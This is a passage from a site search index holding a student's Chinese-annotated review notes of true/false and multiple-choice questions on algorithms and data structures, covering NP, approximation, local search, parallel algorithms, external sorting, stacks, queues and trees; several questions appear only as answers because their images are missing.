<li>\u52a8\u6001\u89c4\u5212\u7b97\u6cd5\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u53ef\u4ee5\u662f\u591a\u9879\u5f0f\u65f6\u95f4\uff0c\u4e5f\u53ef\u4ee5\u662f\u4f2a\u591a\u9879\u5f0f\u65f6\u95f4\u3002\u4f2a\u591a\u9879\u5f0f\u65f6\u95f4\u662f\u6307\u7b97\u6cd5\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u662f\u591a\u9879\u5f0f\u7684\uff0c\u4f46\u5176\u590d\u6742\u5ea6\u4f9d\u8d56\u4e8e\u8f93\u5165\u7684\u6570\u503c\u5927\u5c0f\uff0c\u800c\u4e0d\u662f\u8f93\u5165\u7684\u89c4\u6a21\u3002</li> </ul> <p></p> <p>F</p> <p>Question</p> <p></p> <p>T</p> <p>Question</p> <p>If a Probelm X is in P, then the problem \\(\\bar{X}\\) is also in P.</p> <p>T</p> <p>Question</p> <p>Suppose that \\(X\u2264_{p}\u200bY\\). If X is not in P, then Y is not in P.</p> <p>\u4e5f\u8bb8\u5176\u9006\u5426\u547d\u9898\u66f4\u52a0\u597d\u5224\u65ad\u3002</p> <p>T</p> <p>Question</p> <p></p> <p>myc \u8001\u5e08\u4e3a\u4e86\u8ba9\u5927\u5bb6\u8bb0\u4f4f\u4e5f\u662f\u715e\u8d39\u82e6\u5fc3\u4e86\u3002</p> <p>Question</p> <p>Let X be a problem in NP. We know that both yes-instances (instances for which the answer is yes) and no-instances of X must have certificates.</p> <p>Certificate (complexity)</p> <p>no-instances \u4e0d\u4e00\u5b9a\u9700\u8981 certificates\u3002</p> <p>F</p>","tags":["notes"]},{"location":"note/other/ADS_problems/#_25","title":"\u9009\u62e9\u9898","text":"<p>Question</p> <p></p> <p>A. \u9700\u8981 iff C. co-NP</p> <p>A</p>","tags":["notes"]},{"location":"note/other/ADS_problems/#approximate","title":"Approximate","text":"","tags":["notes"]},{"location":"note/other/ADS_problems/#_26","title":"\u5224\u65ad\u9898","text":"<p>Question</p> <p>There are inputs that force any on-line bin-packing algorithm to use at least 5/3 the optimal number of bins.</p> <p>T</p> <p>Question</p> <p>Unless P = NP, there is no \\(\\rho\\) -approximation for center-selection problem for any \\(\\rho\\) &lt; 2.</p> <p>PPT \u4e0a\u539f\u8bdd\u3002</p> <p>T</p> <p>Question</p> <p>Suppose ALG is an\u00a0\u03b1-approximation algorithm for an optimization problem\u00a0\u220f\u00a0whose approximation ratio is tight. Then for every\u00a0\u03b5&gt;0\u00a0there is no\u00a0(\u03b1\u2212\u03b5)-approximation algorithm for\u00a0\u220f\u00a0unless P = NP. </p> <p>\u4e0d\u5e94\u8be5\u968f\u610f\u6269\u5927\u4e0a\u9762\u7684\u65ad\u8a00\uff1b\u5bf9\u4e8e\u67d0\u4e00\u7b97\u6cd5\u6700\u4f18\u8fd1\u4f3c\u53ef\u80fd\u662f\u6709\u4e0b\u754c\u7684\uff0c\u4f46\u662f\u4e0d\u80fd\u591f\u4fdd\u8bc1\u6240\u6709\u7b97\u6cd5\u5bf9\u67d0\u4e00\u95ee\u9898\u7684\u8fd1\u4f3c\u4e0b\u754c\u90fd\u662f\u540c\u6837\u7684\u6216\u8005\u66f4\u9ad8\u7684\u3002</p> <p>F</p> <p>Question</p> <p>For any instance, a 2-approximation algorithm must give a solution better than a 3-approximation algorithm.</p> <p>F</p> <p>Question</p> <p>As we know there is a 2-approximation algorithm for the Vertex Cover problem. Then we must be able to obtain a 2-approximation algorithm for the Clique problem, since the Clique problem can be polynomially reduced to the Vertex Cover problem.</p> <p>\u89e3\u91ca\u89c1 Q1-2</p> <p>F</p> <p>Question</p> <p></p> <p>Question</p> <p>To solve the vertex cover problem, there is a greedy algorithm that collects the vertex with the highest degree (i.e., the one covering the largest number of edges) and remove it from the graph at each stage. This greedy algorithm achieves an approximation ratio of 2.</p> <p>\u5077\u4e86\u4e00\u4e2a\u8fc7\u7a0b\u6765\uff1a</p> <p></p> <p>\u7ed3\u8bba\u662f\uff08\u4e0d\u4fdd\u771f\uff09\uff1a\u6ca1\u6709\u6709\u9650\u7684\u8fd1\u4f3c\u6bd4\uff1b\u5373\u6ca1\u6709\u5bf9\u5e94\u7684\u8d2a\u5a6a\u8fd1\u4f3c\u7b97\u6cd5\u3002</p> <p>F</p> <p>Question</p> <p>In the bin packing problem, we are asked to pack a list of items\u00a0L\u00a0to the minimum number of bins of capacity 1. For the instance\u00a0L, let\u00a0FF(L)\u00a0denote the number of bins used by the algorithm\u00a0First Fit. The instance\u00a0L\u2032\u00a0is derived from\u00a0L\u00a0by deleting one item from\u00a0L. Then\u00a0FF(L\u2032)\u00a0is at most of\u00a0FF(L).</p> <p>F</p>","tags":["notes"]},{"location":"note/other/ADS_problems/#_27","title":"\u9009\u62e9\u9898","text":"<p>Question</p> <p></p> <p>\u957f\u5f97\u50cf \\(\\land\\) \u7684\u6700\u5c0f\u751f\u6210\u6811 =&gt; pre-order, post-order \u3002</p> <p>C</p> <p>Question</p> <p></p> <p>\u6765\u81ea\u67d0\u5927\u4f6c\u7684\u63a8\u5bfc\uff1a</p> <p></p> <p>Question</p> <p></p> <p>\uff08\u770b\u89c1\u8fd9\u9898\uff0c\u770b\u89c1 yds\uff0c\u5c31\u77e5\u9053\u8be5\u8df3\u4e86\uff09</p> <p>-B</p> <p>Question</p> <p></p> <p>C</p> <p>Question</p> <p></p> <p>D \u548c B,C \u90fd\u77db\u76fe\u4e86\uff0c\u4e0d\u9009\u4f60\u9009\u8c01\uff1f</p> <p>D</p> <p>Question</p> <p></p> <p>D. \u6709\u5411\u65e0\u73af\u56fe\u5c31\u662f\u4e00\u9897\u6811\uff0c\u4e00\u5b9a\u80fd\u591f\u5728\u591a\u9879\u5f0f\u65f6\u95f4\u627e\u5230\u6700\u957f\u8def\u5f84\uff1bBC \u662f ppt \u7ed3\u8bba\u3002</p> <p>D</p>","tags":["notes"]},{"location":"note/other/ADS_problems/#local-search","title":"Local Search","text":"","tags":["notes"]},{"location":"note/other/ADS_problems/#_28","title":"\u5224\u65ad\u9898","text":"<p>Question</p> <p></p> <p>\u6700\u5c11\u663e\u7136\u662f 2 \u4e2a\u70b9\uff0c\u4e14\u4e00\u5b9a\u6709\u4e2d\u5fc3\u7684\u90a3\u4e2a\u70b9\uff1b\u53ea\u8981\u5b83\u4e0d\u662f\u7b2c\u4e00\u4e2a\u88ab\u5220\u9664\u7684\u70b9\uff0c\u90a3\u4e48\u5b83\u4e00\u5b9a\u4e0d\u4f1a\u88ab\u5220\u9664\uff0c\u4e00\u5b9a\u4f1a\u627e\u5230\u6700\u4f18\u89e3\u3002</p> <p>T</p> <p>Question</p> <p></p> <p>\u8bc1\u660e\u662f\u4e0d\u4f1a\u7684\uff0c\u4f46\u662f\u4e0a\u9762\u7684\u53f3\u8fb9 \u7ed9\u51fa\u4e86\u5f88\u597d\u7684\u53cd\u4f8b\uff0c\u8bf4\u660e\u4e86\u9898\u76ee\u4e2d\u4f7f\u7528\u7684 local search \u5728 k-center problem \u4e2d\u7684\u53ef\u63a7\u6027\u8f83\u5dee\u3002</p> <p>Question</p> <p>Starting from the following configuration of a Hopfield Neural Network, the state-filpping algorithm will terminiate at a stable configuration after at most 32 iterations. </p> <p>T</p> <p>Question</p> <p>In local search, if the optimization function has a constant value in a neighborhood, there will be a problem.</p> <p>T</p>","tags":["notes"]},{"location":"note/other/ADS_problems/#randomized-algorithms","title":"Randomized Algorithms","text":"","tags":["notes"]},{"location":"note/other/ADS_problems/#_29","title":"\u5224\u65ad\u9898","text":"<p>Question</p> <p></p> <p>\u5982\u679c a \u672c\u8eab\u5df2\u7ecf\u6392\u5e8f\u5b8c\u6210\u624d\u6b63\u786e\u3002</p> <p>F</p>","tags":["notes"]},{"location":"note/other/ADS_problems/#_30","title":"\u9009\u62e9\u9898","text":"<p>Question</p> <p>The Online Hiring Algorithm ( hire only once )\uff08\u9898\u76ee\u7ed9\u4e86\u4f2a\u4ee3\u7801\uff0c\u8fd9\u91cc\u8282\u7701\u7a7a\u95f4\uff09. Assume that the quality input\u00a0C[]\u00a0is uniformly random. When\u00a0N=271\u00a0and\u00a0k=90, the probability of hiring the Nth candidate is __.</p> <p>\u5728\u4f2a\u4ee3\u7801\u4e2d\uff0c\u6211\u4eec\u5c06 Best \u521d\u59cb\u503c\u8d4b\u503c\u4e3a N\uff1b\u6240\u4ee5\u53ea\u9700\u8981\u6240\u6709\u6bd4 N \u5389\u5bb3\u7684\u4eba\u90fd\u5728\u524d K \u4e2a\u6216\u8005\u524d N-1 \u4e2a\u4eba\u4e2d\u6700\u5389\u5bb3\u7684\u90fd\u5728\u524d K \u4e2a\u4e14 N \u81ea\u5df1\u5c31\u662f\u6700\u5389\u5bb3\u7684\uff1a</p> <p>\\(Pr[S_{N-1}]=\\frac{K}{N} + \\frac{K}{N-1}* \\frac{1}{N}=\\frac{1}{3}\\)</p> <p>Question</p> <p></p> <p>F</p>","tags":["notes"]},{"location":"note/other/ADS_problems/#parallel-algorithms","title":"Parallel Algorithms","text":"","tags":["notes"]},{"location":"note/other/ADS_problems/#_31","title":"\u5224\u65ad\u9898","text":"<p>In order to solve  the maximum finding problem by a parallel  algorithm  with T(n)=O(1) , we need work load \\(W(n)=\u03a9(n^2)\\) in return.</p> <p>random sampling \u53ef\u4ee5 W(n)=O(n)\uff1b\u800c\u6b64\u5904\u53c8\u4f7f\u7528\u4e86 \u03a9\u3002</p> <p>F</p> <p>Question</p> <p></p> <p>T(n) = O(log(n)); W(n)=O(n)</p> <p>F</p> <p>Question</p> <p>Recall the discussion about the Maximum Finding Problem (that is, to find the maximum among\u00a0n\u00a0numbers in an array), Common CRCW memory strategy is used to assure\u00a0T(n)=O(1)\u00a0for the parallel algorithm. Actually, we can also apply Arbitrary CRCW memory strategy to keep\u00a0O(1)\u00a0time complexity. Now let us consider a new memory strategy, namely the\u00a0Concurrent\u00a0Read\u00a0Owner\u00a0Write (CROW). It means that each memory has an official \"owner\". Only the \"owner\" can write to the corresponding memory. Then there is no parallel algorithm that can solve the problem with\u00a0T(n)=O(1)\u00a0using CROW memory strategy.</p> <p>T</p>","tags":["notes"]},{"location":"note/other/ADS_problems/#_32","title":"\u9009\u62e9\u9898","text":"<p>Question</p> <p></p> <p>\u5bf9\u4e8e D \u9009\u9879\uff1a</p> <ul> <li>\u5982\u679c\u6700\u957f\u7684\u4efb\u52a1\u7684\u957f\u5ea6 lm \u8d85\u8fc7\u4e86\u6240\u6709\u4efb\u52a1\u7684\u603b\u957f\u5ea6/\u673a\u5668\u6570\u5f97\u5230\u7684\u5e73\u5747\u957f\u5ea6 la\uff0c\u90a3\u4e48 \\(C_{max}\\) \u5c31\u662f\u8fd9\u4e2a\u6700\u957f\u7684\u957f\u5ea6 lm\uff1b</li> <li>\u5982\u679c\u6700\u957f\u7684\u4efb\u52a1\u4e0d\u8d85\u8fc7\uff0c\u90a3\u4e48\u6700\u7ec8\u53d6\u5f97 \\(C_{max}\\) \u7684\u90a3\u53f0\u673a\u5668\u7684\u6700\u540e\u4e00\u4e2a\u4efb\u52a1\u7684\u957f\u5ea6 l \u4e00\u5b9a\u4e0d\u8d85\u8fc7 lm\uff1b\u5982\u679c\u60f3\u8981 \\(lm &gt; 2OPT(C_max) \\geq 2*la\\) \uff1b\u5219 l \u524d\u9762\u7684\u4efb\u52a1\u603b\u957f\u5ea6\u8d85\u8fc7 la\uff1b\u53c8\u4e00\u5b9a\u6709\u4e00\u53f0\u673a\u5668\u76ee\u524d\u7684\u603b\u4efb\u52a1\u957f\u5ea6\u5c0f\u4e8e la\uff1b\u90a3\u4e48\u6b64\u65f6\u4ecd\u65e7\u80fd\u591f\u8fdb\u884c local search\uff0c\u4e0d\u5e94\u8be5 terminate\u3002</li> </ul> <p>D</p> <p>Question</p> <p></p> <p>\u5c06\u4f9d\u6b21\u8fdb\u884c\u7684 merge \u8fdb\u884c\u4e86\u5e76\u884c\uff0c\u5de5\u4f5c\u91cf\u4e0d\u53d8\uff0c\u800c\u53ea\u6709 O(log(n)) \u5c42\uff0c\u6bcf\u5c42 O(log(n))\u3002</p> <p>A</p> <p>Question</p> <p></p> <p>A</p>","tags":["notes"]},{"location":"note/other/ADS_problems/#external-sort","title":"External sort","text":"","tags":["notes"]},{"location":"note/other/ADS_problems/#_33","title":"\u5224\u65ad\u9898","text":"<p>Question</p> <p>In external sorting, a k-way merging is usually used in order to reduce the number of passes and we will take the k as large as possible as long as we have enough amount of tapes. </p> <p>\u5e76\u884c\u4f18\u5316</p> <p>F</p> <p>Question</p> <p>In general, for a k-way merge we need 2k input buffers and 2 output buffers for parallel operations in external sorting.</p> <p>T</p> <p>Question</p> <p>In general, for a 3-way merge we need 6 input buffers and 2 output buffers for decreasing the number of passes.</p> <p>\u76ee\u7684\u4e0d\u662f\u51cf\u5c11 # passes \uff1b\u800c\u662f\u4e3a\u4e86\u5e76\u884c\u3002</p> <p>F</p>","tags":["notes"]},{"location":"note/other/ADS_problems/#_34","title":"\u9009\u62e9\u9898","text":"<p>Question</p> <p>Given 100,000,000 records of 256 bytes each, and the size of the internal memory is 128MB.  If simple 2-way merges are used, how many passes do we have to do?</p> <ol> <li>\u5148\u770b\u8d77\u521d\u6700\u591a\u80fd\u653e\u591a\u5c11\u4e2a\u6392\u5217\u5bf9\u8c61\uff1a\\(\\frac{128*10^6}{256}=5*10^5\\)\uff1b</li> <li>\u518d\u770b\u6700\u5c11\u80fd\u591f\u83b7\u5f97\u591a\u5c11\u987a\u4e32\uff08runs\uff09\uff1a\\(\\frac{10^8}{5*10^5}=200\\)</li> <li>\u5bf9\u4e8e\u5e73\u5747\u7684 k way merge\uff0c\u6211\u4eec\u81f3\u5c11\u9700\u8981 \\(1+\\lceil \\log_{k}\\#runs \\rceil\\)\uff0c\u4ee3\u5165\u6570\u636e\u5f97 9\u3002</li> </ol> <p>\u6545\u7b54\u6848\u4e3a 9 \u3002</p> <p>Question</p> <p></p> <p>\u5e2e\u6211\u7406\u89e3\u4e86 buffer \u7684\u610f\u601d\uff1b\u7b54\u6848\u6765\u81ea Jianjun Zhou's Notebook</p> <p>Question</p> <p></p> <p>T(N,k) = \\(n\\log_{k}(n)*\\log_{2}k = n\\log(n)\\)</p> <p>A</p>","tags":["notes"]},{"location":"note/other/ADS_problems/#other","title":"Other","text":"<p>\u4e0d\u77e5\u9053\u653e\u54ea\u91cc\u7684\u9898\u3002</p>","tags":["notes"]},{"location":"note/other/ADS_problems/#_35","title":"\u5224\u65ad\u9898","text":"<p>Question</p> <p></p>","tags":["notes"]},{"location":"note/other/ADS_problems/#_36","title":"\u9009\u62e9\u9898","text":"<p>Question</p> <p></p> <p>A \u80af\u5b9a\u5bf9\uff1bB/C \u7b49\u4ef7\uff0c\u6240\u4ee5\u6211\u9009\u4e86 D\u3002</p> <p>D</p>","tags":["notes"]},{"location":"note/other/FDS-questions/","title":"FDS questions","text":"<p>\u8fd9\u662f FDS \u7684\u4e00\u4e9b\u7406\u8bba\u9898\u7684\u9898\u5e93\uff0c\u591a\u4e3a PTA \u4e0a\u7684 HW \u83b7\u5f97\uff0c\u4e5f\u6709\u4e00\u4e9b\u524d\u4eba\u7684\u9898\u5e93\uff0c\u5728\u6b64\u4e5f\u4e00\u5e76\u611f\u8c22\u3002</p> <p>\u4e3b\u8981\u662f\u9009\u62e9\u5224\u65ad\u9898\uff0c\u6bcf\u9898\u7b54\u6848\u5728\u6700\u540e\u7ed9\u51fa\uff1b\u5bf9\u4e8e\u51fd\u6570\u4f53\u548c\u7f16\u7a0b\u9898\uff0c\u7ed9\u51fa\u4e86 PTA \u94fe\u63a5\uff0c\u4f46\u662f\u4e0d\u6e05\u695a\u662f\u5426\u53ea\u6709\u6211\u81ea\u5df1\u80fd\u8bbf\u95ee\uff0c\u6709\u5f85\u786e\u8ba4\u3002</p> <p>Attention</p> <p>\u4e3a\u4e86\u4f5c\u4e3a\u590d\u4e60\u6027\u8d44\u6599\u800c\u5177\u6709\u53ef\u505a\u6027\uff0c\u6211\u5c06\u6240\u6709\u9898\u5e72\u90e8\u5206\u653e\u5728\u4e86\u6ce8\u91ca\u680f\u5185\uff0c\u5c06\u6bcf\u4e00\u9053\u9898\u7684\u7b54\u6848\u653e\u5728\u4e86\u6700\u540e\u9762\uff1b\u622a\u56fe\u4e2d\u7684\u7b54\u6848\u4ec5\u4e3a\u6211\u63d0\u4ea4\u7684\u7b54\u6848\uff0c\u4e0d\u4ee3\u8868\u6700\u7ec8\u7ed3\u679c\u3002</p>","tags":["notes"]},{"location":"note/other/FDS-questions/#i-algorithm-complexity-analysis","title":"I Algorithm Complexity Analysis","text":"","tags":["notes"]},{"location":"note/other/FDS-questions/#i1","title":"I.1 \u5224\u65ad\u9898","text":"<p>Question</p> <p></p> <p>O \u7684\u542b\u4e49\u662f\u5c0f\u4e8e\u6216\u7b49\u4e8e\u3002</p> <p>T</p> <p>Question</p> <p></p> <p>\u9012\u5f52\u8ba1\u7b97\u6590\u6ce2\u90a3\u5951\u6570\u5217\uff0c\u5176\u65f6\u95f4\u590d\u6742\u5ea6\u4f9d\u65e7\u662f\u4e00\u4e2a\u6590\u6ce2\u90a3\u5951\u6570\u5217\uff0c\u4e3a \\(O(2^{N})\\)\u3002</p> time complexity space complexity recursively \\(O(F_{N})\\sim O(2^{N})\\) O(N) lteratively O(N) O(1) <p>F</p> <p>Question</p> <p>\\(n^{0.01}\\) is \\(O(\\log n)\\)</p> <p>\u4e00\u5f00\u59cb\u6ca1\u641e\u61c2\u5565\u610f\u601d\uff08\u542c\u8bf4\u5728\u79bb\u6563\u6570\u5b66\u91cc\u9762\u5b66\u4e86\uff09\u5728 math.stackexchange.com \u4e0a\u627e\u5230\u4e86\u89e3\u7b54\u3002</p> <p></p> <p>\u4e24\u4e2a\u56de\u7b54\uff0c\u5176\u4e00\u8bf4\u660e\u5982\u4f55\u5224\u65ad\uff0c\u5176\u4e8c\u6307\u51fa\u5982\u4f55\u8ba1\u7b97</p> <p>\uff08\u4e5f\u5c31\u662f\u8bf4\u5f53 \\(\\alpha&gt;0\\) \u65f6\uff0c\\(n^{\\alpha} = \\Omega(\\log n)\\) \uff09</p> <p>F</p> <p>Question</p> <p></p> <p>\u6ce8\u610f\u70b9\uff1a</p> <ul> <li>\u522b\u628a N*2 \u770b\u6210\u4e86 N^2 \u95ee\u5c31\u662f\u6211\u4e00\u5f00\u59cb\u770b\u9519\u4e86\u2026\u2026</li> <li>else \u4e2d\u5f53 i &gt; N \u4e4b\u540e\u540e\u9762\u7684\u5faa\u73af\u90fd\u4e0d\u4f1a\u8fdb\u884c\u4e86\uff0c\u4e0d\u7528\u7edf\u8ba1</li> <li>\u6700\u4f4e\u4e0a\u9650\uff0c\u53d6\u8f83\u5c0f\u8005\u3002</li> </ul> <p>T</p> <p>Question</p> <p>An algorithm may or may not require input, but each algorithm is expected to produce at least one result as the output.</p> <p>T</p> <p>Question</p> <p></p> <p>\u6ca1\u8bf4\u5b9e\u73b0\u65b9\u5f0f\uff0c\u6570\u7ec4\u8fd8\u662f\u94fe\u8868\uff1f</p> <p>F</p>","tags":["notes"]},{"location":"note/other/FDS-questions/#i2","title":"I.2 \u9009\u62e9\u9898","text":"<p>Question</p> <p></p> <p>\u9012\u5f52\uff1a\u4e3b\u5b9a\u7406</p> <p>\u7b80\u5355\u6765\u8bf4\u8bb0\u4f4f\u4e0b\u9762\u5c31\u591f\u4e86\uff1a</p> \\[ \\begin{aligned}&amp;\\mathrm{If~}T(n)=aT\\left(\\left\\lceil\\frac nb\\right\\rceil\\right)+O(n^d)\\text{ (for constants} \\quad a&gt;0,b&gt;1,d\\geq0),\\mathrm{~then:}\\\\&amp;T(n)=\\begin{cases}O(n^d)&amp;\\mathrm{~if~}d&gt;\\log_ba\\\\O(n^d\\log n)&amp;\\mathrm{~if~}d=\\log_ba\\\\O(n^{\\log_ba})&amp;\\mathrm{~if~}d&lt;\\log_ba&amp;\\end{cases}\\end{aligned} \\] <p>\u6216\u8005\u6211\u4eec\u4f7f\u7528\u66f4\u52a0\u7b80\u5355\u7684\u65b9\u6cd5\uff0c\u624b\u52a8\u9012\u5f52\uff0c\u53d1\u73b0\uff1a</p> <p>\u5bf9\u4e8e P1: \\(T\\left( \\frac{N}{3^{k}}\\right)=T(1)+k=T(1)\\)\uff0cP2 \u540c\u7406\uff0c\u5c31\u53ef\u4ee5\u83b7\u5f97\u7b54\u6848\u3002</p> <p>B</p> <p>Question</p> <p></p> <p>\u77e9\u9635\u538b\u7f29\u50a8\u5b58\u81ea\u884c\u641c\u7d22</p> <p>\u4e0d\u96be\u53d1\u73b0 \\(m_{30,30}\\) \u662f\u7b2c \\(2+28*3+2=88\\) \u4e2a\u6570\uff0c\u4f46\u662f\u6570\u7ec4 N \u4ece 0 \u5f00\u59cb</p> <p>B</p>","tags":["notes"]},{"location":"note/other/FDS-questions/#ii-dsliststackqueue","title":"II DS:List/Stack/Queue","text":"","tags":["notes"]},{"location":"note/other/FDS-questions/#ii1","title":"II.1 \u5224\u65ad\u9898","text":"<p>Question</p> <p></p> <p>\u94fe\u8868\u7684\u8282\u70b9\u6570\u662f\u53ef\u53d8\u7684\u3002</p> <p>T</p> <p>Question</p> <p>For a sequentially stored linear list of length N, the time complexities for random query and inserting the first element are O(N) and O(1), respectively.</p> <p>\u987a\u5e8f/\u8fde\u7eed\u50a8\u5b58\u7684\u7ebf\u6027\u8868\u4e00\u822c\u6307\u6570\u7ec4\u5b9e\u73b0\u7684\u5f62\u5f0f\uff0c\u67e5\u8be2\u4e3a O(1)\uff0c\u63d2\u5165\u4e3a O(N)</p> <p>F</p>","tags":["notes"]},{"location":"note/other/FDS-questions/#ii2","title":"II.2 \u9009\u62e9\u9898","text":"<p>Infix to postfix convertion\uff0c\u6211\u4eec\u53ea\u662f\u628a\u64cd\u4f5c\u7b26\u5728 stack \u4e2d\u8fdb\u884c\u4e86\u64cd\u4f5c\u3002\u5bf9\u4e8e\u64cd\u4f5c\u7b26\u538b\u6808\u548c\u51fa\u6808\u7684\u51b3\u5b9a\uff0c\u6bd4\u8f83\u5f53\u524d\u6808\u9876\u64cd\u4f5c\u7b26 A \u548c\u5f53\u524d\u51b3\u5b9a\u7684\u64cd\u4f5c\u7b26 B \u7684\u4f18\u5148\u7ea7\uff0c\u5982\u679c \\(A\\geq B\\) \u5219 A \u51fa\u6808\uff0c\u7ee7\u7eed\u5411\u4e0b\u6bd4\uff0c\u76f4\u5230 A &lt; B \u6216\u8005\u6808\u7a7a\u7684\u65f6\u5019\uff0c\u5c06 B \u538b\u6808\u3002\u82e5\u5de6\u62ec\u53f7\uff0c\u4e00\u5b9a\u52a0\u5165\uff1b\u5e76\u76f4\u5230\u53f3\u62ec\u53f7\u51fa\u73b0\u624d\u628a\u5de6\u62ec\u53f7\u8fde\u5e26\u6808\u9876\u7684\u64cd\u4f5c\u7b26\u5f39\u51fa\u3002</p> <p>B</p> <p></p> <p>C</p> <p></p> <p>\u4e0d\u77e5\u9053\u5f53\u65f6\u600e\u4e48\u60f3\u7684\u2026\u2026\u5e38\u89c1\u7ed3\u6784\u53ca\u64cd\u4f5c\u590d\u6742\u5ea6\u5982\u4e0b\uff1b\u8fd9\u91cc\u63d2\u5165\u548c\u5220\u9664\u53ea\u5728\u6700\u540e\u9762\uff0c\u6240\u4ee5\u7565\u6709\u4e0d\u540c\u3002</p> <p></p> <p>D</p> <p></p> <p>\u540e\u9762\u4fe9\u4e0d\u7528\u8bf4\uff0c\u524d\u9762\u4e09\u4e2a <code>o</code> \u770b\u4f3c \\(A^{3}_{3} = 6\\) \uff0c\u4f46\u662f\u5728\u6808\u4e2d\u662f\u4e0d\u4e00\u6837\u6ef4\u3002</p> <p>5 \u79cd\uff1a123,132,231,213,321 \uff08\u6570\u5b57\u8868\u793a\u4e3a\u5165\u6808\u987a\u5e8f\uff09</p> <p>C</p> <p>\u5224\u65ad\u4e00\u4e2a\u5faa\u73af\u961f\u5217QU\uff08\u6700\u591a\u5143\u7d20\u4e3aMaxSize\uff09\u4e3a\u7a7a\u7684\u6761\u4ef6\u662f\uff08\uff09\u3002</p> <p>A.QU.front == QU.rear</p> <p>B.QU.front != QU.rear</p> <p>C.QU.front == (QU.rear + 1) % MaxSize</p> <p>D.QU.front != (QU.rear + 1) % MaxSize</p> <p>\u7531\u4e8e\u6211\u4eec\u4e00\u822c\u521d\u59cb\u5316 front = rear = 0 \uff0c\u6240\u4ee5 A \u4e3a\u7a7a\uff0cC \u4e3a\u6ee1\u3002</p> <p>A</p> <p></p> <p>\u8fd9\u91cc\u4e0d\u4e00\u6837\uff0c\u53ea\u8bf4\u4e86 \\(front = rear\\) \uff0c\u6240\u4ee5\u6211\u4eec\u901a\u8fc7\u5185\u90e8\u5143\u7d20\u4e2a\u6570\u6765\u5224\u65ad\u8f83\u597d\u3002</p> <p>B</p>","tags":["notes"]},{"location":"note/other/FDS-questions/#ii3","title":"II.3 \u51fd\u6570/\u7f16\u7a0b\u9898","text":"<p>Reverse Linked List</p> <p>Pop Sequence</p>","tags":["notes"]},{"location":"note/other/FDS-questions/#iii-tree","title":"III Tree","text":"","tags":["notes"]},{"location":"note/other/FDS-questions/#iii1","title":"III.1 \u5224\u65ad\u9898","text":"<p>T</p> <p>It is always possible to represent a tree by a one-dimensional integer array.  </p> <p>T</p> <p>There exists a binary tree with 2016 nodes in total, and with 16 nodes having only one child.</p> <p>\u770b\u4e0b\u4e00\u9898\u5c31\u61c2\u4e86\u3002</p> <p>F</p> <p>For any nonempty binary tree, if we set \\(n_{i}\\) as the number of nodes with i children, then we get that \\(n_0=n_2+1\\)</p> <p>\u8bbe e \u8868\u793a\u8fb9\u7684\u6570\u91cf\uff0cn \u8868\u793a\u603b\u7ed3\u70b9\u6570\uff0c\u5219\u6709</p> \\[ \\begin{cases} n = n_{0}+n_{1}+n_{2} \\\\ e = n-1 \\\\ e = n_{1}+ 2*n_{2} \\end{cases} \\implies n_{0} = n_{2} +1 \\] <p>T</p>","tags":["notes"]},{"location":"note/other/FDS-questions/#iii2","title":"III.2 \u9009\u62e9\u9898","text":"<p>in the process\uff0c\u6700\u7ec8\u786e\u5b9e\u662f 5 \u4e2a\u6ca1\u52a8\uff0c\u4f46\u662f\u8fc7\u7a0b\u4e2d\u53ea\u6709 4 \u4e2a\u3002</p> <p>C</p> <p></p> <p>\u7ebf\u7d22\u4e8c\u53c9\u6811\u5de6\u53f3\u6307\u9488\u7a7a\u4e86\u5c31\u8fde\u524d\u9a71\u548c\u540e\u9a71\uff0c\u65e0\u8bba\u548c\u524d\u9a71\u540e\u9a71\u4e4b\u95f4\u672c\u6765\u662f\u5426\u76f4\u63a5\u8fde\u63a5\u3002</p> <p>D</p> <p></p> <p>\u7b26\u53f7\u540c\u524d\uff0c\u6709\uff1a</p> \\[ \\begin{cases} e = n_{3}+n_{2}+n_{1}+n_{0}-1 \\\\ e= 3n_{3}+2n_{2}+n_{1} \\end{cases} \\implies n_{0}=2n_{3}+n_{2}+1 \\] <p>D</p> <p></p> <p>\u8fd9\u4e2a\u2026\u2026\u611f\u89c9\u4e00\u4e2a\u4e00\u4e2a\u63a8\u5427\uff0c\u505a\u7ed3\u8bba\u8bb0\u4e00\u8bb0\u4e5f\u53ef\u4ee5\u3002</p> <p>C</p>","tags":["notes"]},{"location":"note/other/FDS-questions/#iv-binary-search-tree","title":"IV Binary (Search) Tree","text":"","tags":["notes"]},{"location":"note/other/FDS-questions/#iv1","title":"IV.1 \u5224\u65ad\u9898","text":"<p>For binary heaps with N elements, the BuildHeap function (which adjust an array of elements into a heap in linear time) does at most N - log(N+1)comparisons between elements.</p> <p>\u5e94\u8be5\u662f 2N-2 \u6b21\uff0c\u8bc1\u660e\u89c1 StackExchange \u3002</p> <p>F</p> <p>There are more NULL pointers than the actual pointers in the linked representation of any binary tree.</p> <p>T </p> <p>The number of leaf nodes in a ternary tree (\u4e09\u53c9\u6811) is only related to the number of degree 2 nodes and that of degree 3 nodes, i.e it has nothing to do with the number of degree 1 nodes.</p> <p>T </p> <p>Note</p> <p>\u5b8c\u5168\u4e8c\u53c9\u6811\u7684\u53f6\u5b50\u8282\u70b9\u6570\u4e3a\u603b\u8282\u70b9\u6570 N/2 \u5411\u4e0a\u53d6\u6574 In a binary search tree, the keys on the same level from left to right must be in sorted (non-decreasing) order.</p> <p>T</p> <p>In a binary search tree which contains several integer keys including 4, 5, and 6, if 4 and 6 are on the same level, then 5 must be their parent.</p> <p>\u6839\u636e\u4e0a\u9762\u7684\u5224\u65ad\u9898\u53ef\u4ee5\u77e5\u9053 4 \u80af\u5b9a\u5728 5 \u5de6\u5b50\u6811\u4e2d\uff0c6 \u5728 5 \u53f3\u5b50\u6811\u4e2d\uff0c\u4f46\u662f\u4e0d\u4e00\u5b9a\u76f4\u63a5\u8fde\u5728 5 \u4e0a\uff0c\u4e5f\u5c31\u662f\u8bf4\u4e0d\u4e00\u5b9a\u662f parent \u3002</p> <p>F</p> <p>Given a binary search tree with 20 integer keys which include 10, 11, and 12, if 10 and 12 are on the same level, then 11 must be their common ancestor.</p> <p>\u6ce8\u610f\u662fcommon ancestor\uff0c\u4e0d\u4e00\u5b9a\u662fparent</p> <p>T</p> <p>If a complete binary tree with 137 nodes is stored in an array (root at position 1), then the nodes at positions 128 and 137 are at the same level.</p> <p>\u6362\u6211\u8fd9\u9053\u9898\u5c31\u95ee 127\uff0c\u4e07\u4e00\u6709\u4eba\u4e0d\u8bb0\u5f97\u5b8c\u5168\u4e8c\u53c9\u6811\u7684\u6570\u5217\u4ece 1 \u5f00\u59cb\u7528\u5462(bushi)</p> 